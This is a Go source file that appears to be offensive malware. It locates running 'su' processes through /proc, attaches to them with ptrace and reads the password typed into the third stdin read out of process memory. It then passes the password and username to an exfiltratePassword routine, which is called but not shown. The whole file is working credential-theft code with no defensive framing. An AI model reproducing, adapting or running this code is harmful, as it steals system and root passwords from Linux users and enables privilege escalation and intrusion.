package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"regexp"
	"strconv"
	"strings"
	"syscall"
	"unicode"
)

func findSUProcesses() ([]int, error) {
	var suPIDs []int
	dir, err := os.Open("/proc")
	if err != nil {
		return nil, err
	}
	defer dir.Close()
	entries, err := dir.Readdirnames(0)
	if err != nil {
		return nil, err
	}
	for _, entry := range entries {
		pid, err := strconv.Atoi(entry)
		if err != nil {
			continue
		}
		if isSUProcess(pid) {
			suPIDs = append(suPIDs, pid)
		}
	}

	return suPIDs, nil
}

func isSUProcess(pid int) bool {
	cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	return regexp.MustCompile(`su `).MatchString(strings.ReplaceAll(string(cmdline), "\x00", " "))
}

func traceSUProcess(pid int) {
	//fmt.Printf("Tracing: %d\n", pid)
	err := syscall.PtraceAttach(pid)
	if err != nil {
		return
	}
	defer syscall.PtraceDetach(pid)

	var regs syscall.PtraceRegs
	var readSyscallCount int
	for {
		_, err := syscall.Wait4(pid, nil, 0, nil)
		if err != nil {
			return
		}

		err = syscall.PtraceGetRegs(pid, &regs)
		if err != nil {
			fmt.Printf("su process died.")
			return
		}
		if regs.Orig_rax == 0 && regs.Rdx == 511 && regs.Rdi == 0 {
			readSyscallCount++
			if readSyscallCount == 3 {
				bufferAddr := uintptr(regs.Rsi)
				buffer := make([]byte, 511)

				_, err := syscall.PtracePeekData(pid, bufferAddr, buffer)
				if err != nil {
					return
				}
				if strings.Contains(string(buffer), "\n") {
					cmdline, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
					if err != nil {
						return
					}

					username := "root"
					if len(cmdline) > 3 {
						username = string((cmdline[3:]))
					}
					password := strings.Split(string(buffer), "\n")[0]
					if func(s string) bool {
						for _, r := range s {
							if !unicode.IsPrint(r) {
								return false
							}
						}
						return true
					}(password) {
						go exfiltratePassword(strings.TrimLeft(string(password), "\n"), username)
					}
				}
				return
			}

		}
		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			return
		}
	}
}
